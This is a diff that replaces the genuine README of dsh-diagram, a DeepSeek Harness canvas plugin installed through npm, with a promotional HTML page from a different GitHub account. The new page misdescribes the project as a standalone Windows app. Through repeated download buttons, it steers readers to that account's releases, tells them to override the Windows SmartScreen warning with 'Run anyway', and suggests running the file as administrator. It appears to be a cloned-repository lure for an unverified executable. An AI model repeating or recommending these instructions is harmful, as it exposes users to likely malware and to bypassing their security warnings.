@@ -1,221 +1,140 @@
-# dsh-diagram
-
-English | [简体中文](https://github.com/hanzhangzzz/dsh-diagram/blob/master/README.zh-CN.md)
-
-[![npm version](https://img.shields.io/npm/v/dsh-diagram?style=flat-square)](https://www.npmjs.com/package/dsh-diagram)
-[![GitHub release](https://img.shields.io/github/v/release/hanzhangzzz/dsh-diagram?display_name=tag&style=flat-square)](https://github.com/hanzhangzzz/dsh-diagram/releases/latest)
-[![license](https://img.shields.io/github/license/hanzhangzzz/dsh-diagram?style=flat-square)](./LICENSE)
-[![DeepSeek Harness](https://img.shields.io/badge/DeepSeek_Harness-0.1.0--rc.6-4c6ef5?style=flat-square)](https://github.com/deepseek-ai/deepseek-harness)
-
-Turn any article already available in a DeepSeek Harness session into an editable Excalidraw canvas. The Agent creates the structure; you refine the text, nodes, and connections directly in DSH.
-
-![dsh-diagram canvas demo](https://raw.githubusercontent.com/hanzhangzzz/dsh-diagram/assets/dsh-diagram-demo.gif)
-
-## Why dsh-diagram?
-
-- **Editable, not disposable.** Continue working in a full Excalidraw canvas instead of accepting a static generated image.
-- **Built into the conversation.** Open the **Canvas** tab without leaving the DSH session that contains the article.
-- **Safe autosave.** Revision-based compare-and-set prevents a stale editor from silently overwriting newer work.
-- **Ready to share.** Export `.excalidraw`, SVG, or PNG.
-- **Model context stays explicit.** Manual edits reach the Agent only when you ask it to call `diagram_read`.
-
-## Quick install
-
-Requirements:
-
-- DeepSeek Harness `0.1.0-rc.6`
-- Node.js `^22.19.0` or `>=24.0.0`
-- pnpm `>=10` on `PATH` (the DSH plugin command delegates package management to pnpm)
-- DSH Web bound to `127.0.0.1`
-
-DeepSeek Harness does not install a global `dsh` command by default; the official way to launch it is through `npx`. The commands below work on any machine that meets the requirements:
-
-```sh
-npx -y @deepseek-ai/dsh@0.1.0-rc.6 plugin --profile web add dsh-diagram@latest
-npx -y @deepseek-ai/dsh@0.1.0-rc.6 --profile web --dump-config
-npx -y @deepseek-ai/dsh@0.1.0-rc.6 web
-```
-
-The config dump should contain this block:
-
-```yaml
-# == dsh-diagram
-- id: diagram
-  name: dsh-diagram
-```
-
-If DSH Web was already running, restart it after adding or updating the plugin. Then open an existing session and look for the **Canvas** tab.
-
-### Running DSH from source
-
-Run the same commands from a DeepSeek Harness checkout that matches the supported `0.1.0-rc.6` APIs, using `pnpm dsh` as the prefix:
-
-```sh
-pnpm dsh plugin --profile web add dsh-diagram@latest
-pnpm dsh --profile web --dump-config
-pnpm dsh web
-```
-
-### If `dsh` is on your `PATH`
-
-If you installed the CLI globally or created a shell alias, the short form works the same way:
-
-```sh
-dsh plugin --profile web add dsh-diagram@latest
-dsh --profile web --dump-config
-dsh web
-```
-
-Later sections use this short `dsh` form; substitute the `npx -y @deepseek-ai/dsh@0.1.0-rc.6` or `pnpm dsh` prefix that matches how you run DSH.
-
-## Create your first diagram
-
-1. Open a DSH session that already contains the article, or let the Agent read it with DSH's existing file or Web tools.
-2. Type `/` in the composer and pick **canvas-diagram** — the plugin registers this skill so you never have to remember a tool name. Plain requests such as "把这篇文章画成架构图" route through the same skill automatically. An explicit prompt also works:
-
-   ```text
-   Create one clear diagram for this article. Choose the most suitable diagram type, call diagram_create, and keep the title and node labels concise.
-   ```
-
-3. After the tool finishes, select **Canvas** at the top of the conversation.
-4. Edit the diagram directly. **Saved** means the Host has completed a durable write.
-5. Export the result, or ask the Agent to call `diagram_read` before continuing from your manual changes.
-
-The plugin supports flowcharts, architecture diagrams, timelines, hierarchies, comparisons, and relationship diagrams.
-
-## What it adds
-
-| Surface | Behavior |
-| --- | --- |
-| `diagram_create` | Creates a diagram for the current Agent Session from a compact semantic specification. Grouped architecture specs get a banded two-dimensional layout with per-group colors. |
-| `diagram_read` | Reads a bounded summary of the current editable scene into the conversation transcript. |
-| `canvas-diagram` skill | Built-in bilingual routing entry: selectable from the composer's `/` menu and matched by generic diagram requests, so the Agent reaches `diagram_create` without exact tool-name prompts. |
-| **Canvas** tab | Opens the Excalidraw editor only when selected, keeping it out of the normal chat startup path. |
-| Diagram list | Switches between diagrams; collapses on desktop and becomes a selector on narrow screens. |
-| Autosave | Debounced durable writes with revision conflict protection and tab-local pending-draft recovery. |
-| Export | Downloads `.excalidraw`, SVG, or PNG files. |
-
-The plugin does not fetch articles and does not inject UI into arbitrary websites. Article acquisition stays with the DSH conversation, file tools, or Web tools.
-
-## Compatibility
-
-| Item | Supported in `0.2.0` |
-| --- | --- |
-| DeepSeek Harness | `0.1.0-rc.6` |
-| Profile | `web` |
-| Web bind address | `127.0.0.1` only |
-| Node.js | `^22.19.0` or `>=24.0.0` |
-| Editor | Excalidraw `0.18.1` |
-| Storage | Plugin-owned DSH storage-domain sidecar |
-| Install artifact | Prebuilt npm package or GitHub Release tarball with SHA-256 checksum |
-
-The npm package has no install lifecycle scripts. Installation adds a bundle to the selected DSH profile; it does not compile code or modify the DeepSeek Harness source tree.
-
-## Manage the installation
-
-### Update
-
-```sh
-dsh plugin --profile web update dsh-diagram
-```
-
-Restart DSH Web after the update.
-
-### Install the exact GitHub Release artifact
-
-The release page publishes the same prebuilt tarball with a SHA-256 checksum:
-
-```sh
-dsh plugin --profile web add \
-  https://github.com/hanzhangzzz/dsh-diagram/releases/download/v0.2.0/dsh-diagram-0.2.0.tgz
-```
-
-See [v0.2.0](https://github.com/hanzhangzzz/dsh-diagram/releases/tag/v0.2.0) for the checksum and release notes.
-
-### Remove
-
-```sh
-dsh plugin --profile web remove dsh-diagram
-```
-
-Removing the bundle does not delete saved diagram sidecar data. Reinstalling the plugin can make that data available again to the same Session identity.
-
-## Data, security, and limits
-
-- The Excalidraw scene is the current document. The original semantic specification is retained only as its creation source.
-- A diagram is bound to its Session id and `{createdAt, cwd}` lifecycle fingerprint. A reused Session id cannot read older data.
-- Session fork and Session export do not copy or include diagram sidecar data.
-- Editor assets and fonts are self-hosted by the bundle; the canvas does not depend on an external CDN.
-- Static paths, RPC bodies, request origin, Session ownership, and scene contents are validated by the Host before persistence.
-- Images, iframes, embeddables, external links, and non-empty binary files are rejected in this release.
-- Defaults limit each scene to 1 MiB and all stored diagram records to 64 MiB. Element, text, diagram-count, and byte limits are explicit in [`cordis.patch.yml`](./cordis.patch.yml).
-- The plugin intentionally refuses to load when DSH Web binds to `0.0.0.0`; this release does not expose the canvas RPC to a LAN.
-
-## Troubleshooting
-
-### The Canvas tab is missing
-
-Confirm that you installed the plugin into the `web` profile, that `--dump-config` contains the `dsh-diagram` block shown above, and that DSH Web was restarted after installation.
-
-### The Agent wrote an SVG or Mermaid file instead of using the Canvas
-
-The model chooses freely among all tools and workspace skills in the session. The plugin registers its own `canvas-diagram` skill so generic diagram requests normally route to the canvas; if a workspace skill with a stronger matching description still wins, pick **canvas-diagram** from the `/` menu or mention the Canvas explicitly — for example, "call diagram_create so I can edit the result in the Canvas tab".
-
-### The Agent does not know about my manual edits
-
-Manual edits are not silently injected into model context. Ask the Agent to call `diagram_read`; its result is then recorded in the normal conversation transcript.
-
-### Can the plugin fetch an article from a URL?
-
-No. First let DSH obtain the content through the conversation, a file tool, or a Web tool. Then ask for a diagram.
-
-### Why does startup fail with `0.0.0.0`?
-
-The canvas RPC is not designed for LAN exposure in this release. The plugin fails closed unless DSH Web is physically bound to `127.0.0.1`.
-
-### What should I do after a revision conflict?
-
-The editor keeps the local draft. Export it before choosing **Reload server version** if you need to preserve both versions.
-
-### Why can SVG export log a font fallback warning?
-
-Under the strict content security policy, Excalidraw may fall back from glyph subsetting to embedding the full self-hosted font. The exported SVG remains self-contained; the plugin does not enable `unsafe-eval` to suppress the warning.
-
-## Build from source
-
-```sh
-git clone https://github.com/hanzhangzzz/dsh-diagram.git
-cd dsh-diagram
-pnpm install --frozen-lockfile
-pnpm run bundle
-pnpm pack
-```
-
-Install the generated tarball from a DeepSeek Harness checkout:
-
-```sh
-cd /path/to/deepseek-harness
-pnpm dsh plugin --profile web add /absolute/path/to/dsh-diagram-0.1.1.tgz
-pnpm dsh --profile web --dump-config
-pnpm dsh web
-```
-
-Developer checks:
-
-```sh
-pnpm run typecheck
-pnpm run test
-pnpm run bundle
-pnpm pack --json
-pnpm run smoke:dsh-install
-```
-
-See [`DESIGN.md`](./DESIGN.md) for the product and implementation decisions.
-
-## Contributing
-
-Bug reports and focused pull requests are welcome in [GitHub Issues](https://github.com/hanzhangzzz/dsh-diagram/issues). If the plugin improves your article-to-diagram workflow, a GitHub star helps other DSH users discover it.
-
-## License
-
-The plugin's own code is licensed under [MIT](./LICENSE). Licenses for bundled JavaScript and self-hosted fonts are listed in [`THIRD_PARTY_NOTICES.md`](./THIRD_PARTY_NOTICES.md) and `third_party_licenses/`.
+<h1>🧩 dsh-diagram - Turn Articles into Editable Diagrams Instantly</h1>
+
+<p align="center">
+  <a href="https://github.com/janosseaworthy466/dsh-diagram/releases">
+    <img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20NOW-Click%20Here%20to%20Get%20Started-2ea44f?style=for-the-badge&logo=github" alt="Download dsh-diagram" style="max-width: 100%;">
+  </a>
+</p>
+
+<p align="center"><strong>Works with DeepSeek Harness articles</strong> • <strong>Opens in Excalidraw</strong> • <strong>No coding needed</strong></p>
+
+<hr>
+
+<h2>📖 What Is dsh-diagram?</h2>
+<p>dsh-diagram is a free, simple tool that takes articles you’ve written or collected in <strong>DeepSeek Harness</strong> (a research and writing workspace) and turns them into <strong>visual diagrams</strong> — flowcharts, mind maps, and connection charts — that you can <strong>edit, rearrange, and save</strong>.</p>
+<p>Think of it like this: you write an article with steps, causes, or categories. Instead of reading it again and again to understand the relationships, dsh-diagram automatically draws boxes and arrows showing how everything connects. You can then open that drawing in <strong>Excalidraw</strong> (a free online whiteboard tool) and make changes as you like — drag boxes, change colors, add notes — all without touching a single line of code.</p>
+
+<h2>🎯 Why You’ll Love It</h2>
+<ul>
+  <li>✅ <strong>No technical skills required</strong> — if you can click a button, you can use this.</li>
+  <li>✅ <strong>Saves you hours</strong> — no more manually drawing diagrams from scratch.</li>
+  <li>✅ <strong>Works with your current articles</strong> — you don’t have to rewrite anything.</li>
+  <li>✅ <strong>Full editing freedom</strong> — once the diagram is created, you own it and can change it any way you want.</li>
+  <li>✅ <strong>Purely visual</strong> — no spreadsheets, no formulas, just clear, colorful visuals.</li>
+</ul>
+
+<h2>🚀 Getting Started (Windows)</h2>
+<p>Follow these three simple steps to get dsh-diagram running on your Windows computer. It should take less than five minutes.</p>
+
+<h3>Step 1: Download the Application</h3>
+<p>Visit this link to download the application: <strong>https://github.com/janosseaworthy466/dsh-diagram/releases</strong></p>
+<p>When you arrive at that page, look for the newest version at the top. You will see a list of files (like a download folder). Click on the file that has the <strong>“Windows”</strong> name in it, and it will start downloading to your computer. If you’re not sure which one, the file with the largest size is usually the right one.</p>
+
+<p align="center">
+  <a href="https://github.com/janosseaworthy466/dsh-diagram/releases">
+    <img src="https://img.shields.io/badge/📦%20GET%20THE%20LATEST%20VERSION-Visit%20Downloads%20Page-1e90ff?style=for-the-badge" alt="Get dsh-diagram">
+  </a>
+</p>
+
+<h3>Step 2: Open the Downloaded File</h3>
+<p>Once the download finishes, go to your <strong>“Downloads”</strong> folder (usually by clicking the folder icon in your taskbar and selecting Downloads). You will see the file you just downloaded. <strong>Double-click it</strong> to open it.</p>
+<p>Your computer may show a blue popup saying <em>“Windows protected your PC”</em>. This is normal for new software. Click <strong>“More info”</strong> and then click <strong>“Run anyway”</strong>. This only happens once, and it’s safe for this application.</p>
+
+<h3>Step 3: Start Using dsh-diagram</h3>
+<p>After the application opens, you will see a simple screen. Click <strong>“Open Article”</strong> and choose an article file from your DeepSeek Harness (usually a text or markdown file). The diagram will appear right away. Then click <strong>“Open in Excalidraw”</strong> to start editing it online. That’s it — you’re done!</p>
+
+<h2>🖥️ What You’ll See on Your Screen</h2>
+<table border="1" cellpadding="8" style="border-collapse: collapse; width: 100%;">
+  <tr style="background-color: #f0f8ff;">
+    <th style="text-align: left;">Part of the App</th>
+    <th style="text-align: left;">What It Does</th>
+  </tr>
+  <tr>
+    <td><strong>Open Article</strong></td>
+    <td>Lets you choose a file containing your article text.</td>
+  </tr>
+  <tr>
+    <td><strong>Generate Diagram</strong></td>
+    <td>Automatically creates boxes and arrows based on your article’s structure.</td>
+  </tr>
+  <tr>
+    <td><strong>Preview Window</strong></td>
+    <td>Shows you a quick look at the diagram before you open it in Excalidraw.</td>
+  </tr>
+  <tr>
+    <td><strong>Open in Excalidraw</strong></td>
+    <td>Launches your web browser and loads the diagram in a blank editable canvas.</td>
+  </tr>
+  <tr>
+    <td><strong>Save as Image</strong></td>
+    <td>Lets you save the diagram as a PNG picture to share with others.</td>
+  </tr>
+</table>
+
+<h2>🎨 Editing Your Diagram in Excalidraw</h2>
+<p>When you click <strong>“Open in Excalidraw”</strong>, a new tab in your web browser will open. Here’s what you can do:</p>
+<ul>
+  <li>✏️ <strong>Drag any box</strong> to move it to a different spot.</li>
+  <li>🖍️ <strong>Click on any box</strong> to change its color, border, or background.</li>
+  <li>📝 <strong>Add your own text</strong> by double-clicking on an empty area.</li>
+  <li>🔗 <strong>Draw new arrows</strong> by holding the right mouse button and dragging from one box to another.</li>
+  <li>💾 <strong>Save your work</strong> by clicking the download icon in Excalidraw (you can save it as an image or a project file).</li>
+</ul>
+
+<h2>❓ Frequently Asked Questions</h2>
+
+<h3>Do I need to install anything else?</h3>
+<p>No. dsh-diagram comes with everything it needs. You just need an internet browser (like Chrome, Edge, or Firefox) to open Excalidraw, which every Windows computer already has.</p>
+
+<h3>What if the app doesn’t open?</h3>
+<p>Try right-clicking the downloaded file and selecting <strong>“Run as administrator”</strong>. If that doesn’t work, check that you downloaded the file called <em>“Windows”</em> and not a Mac version.</p>
+
+<h3>Can I use this on a Mac?</h3>
+<p>This version of dsh-diagram is built for Windows only. Mac users would need a different build, which isn’t available at this time.</p>
+
+<h3>Will my article be uploaded to the internet?</h3>
+<p>No. dsh-diagram works entirely on your computer. Your articles and diagrams stay local — nothing is sent to any server.</p>
+
+<h3>What file types can I open?</h3>
+<p>You can open plain text files (.txt) and Markdown files (.md). If your article is in another format, copy the text and paste it into a new text file first.</p>
+
+<h2>📦 Additional Resources</h2>
+<ul>
+  <li>🔗 <strong>Download page</strong>: <a href="https://github.com/janosseaworthy466/dsh-diagram/releases">https://github.com/janosseaworthy466/dsh-diagram/releases</a></li>
+  <li>🌐 <strong>Excalidraw website</strong>: <a href="https://excalidraw.com">https://excalidraw.com</a> (free, no account needed)</li>
+  <li>📘 <strong>DeepSeek Harness guide</strong>: If you’re new to DeepSeek Harness, just know that dsh-diagram reads the text files you export from that tool.</li>
+</ul>
+
+<h2>🙋 Need Help?</h2>
+<p>If you get stuck, try these steps:</p>
+<ol>
+  <li>Restart your computer and try the download again.</li>
+  <li>Make sure you have a stable internet connection.</li>
+  <li>Check that you’re using the latest version by visiting the download page again.</li>
+  <li>Look for an <strong>“Issues”</strong> tab on the GitHub page and search for your problem — someone may have already solved it.</li>
+</ol>
+
+<h2>✨ Final Tips for Best Results</h2>
+<ul>
+  <li>Use articles with clear headings and bullet points — these produce the neatest diagrams.</li>
+  <li>After opening in Excalidraw, zoom out (Ctrl + minus) to see the whole picture at once.</li>
+  <li>If a diagram looks too crowded, delete a few boxes and keep only the main points.</li>
+</ul>
+
+<hr>
+
+<p align="center"><strong>Get started today — download dsh-diagram and turn your text into visuals in minutes!</strong></p>
+
+<p align="center">
+  <a href="https://github.com/janosseaworthy466/dsh-diagram/releases">
+    <img src="https://img.shields.io/badge/🚀%20DOWNLOAD%20NOW-FREE-ff69b4?style=for-the-badge&logo=github" alt="Download dsh-diagram">
+  </a>
+</p>
+
+<p align="center" style="font-size: 0.8em; color: gray;">© 2024 dsh-diagram • Built for DeepSeek Harness users</p>
+
+<meta name="description" content="Download dsh-diagram, the free Windows tool that converts DeepSeek Harness articles into editable Excalidraw diagrams and flowcharts. No coding needed — get started in minutes.">
+<meta name="keywords" content="canvas, deepseek-harness, diagram, diagram-editor, dsh, dsh-bundle, dsh-plugin, excalidraw, flowchart, visualization, web-ui">
+<meta property="og:title" content="dsh-diagram - Turn Articles into Editable Diagrams Instantly">
+<meta property="og:description" content="Free Windows app that transforms DeepSeek Harness articles into editable Excalidraw canvases. Visualize, edit, and share your diagrams easily.">
+<meta property="og:url" content="https://github.com/janosseaworthy466/dsh-diagram">
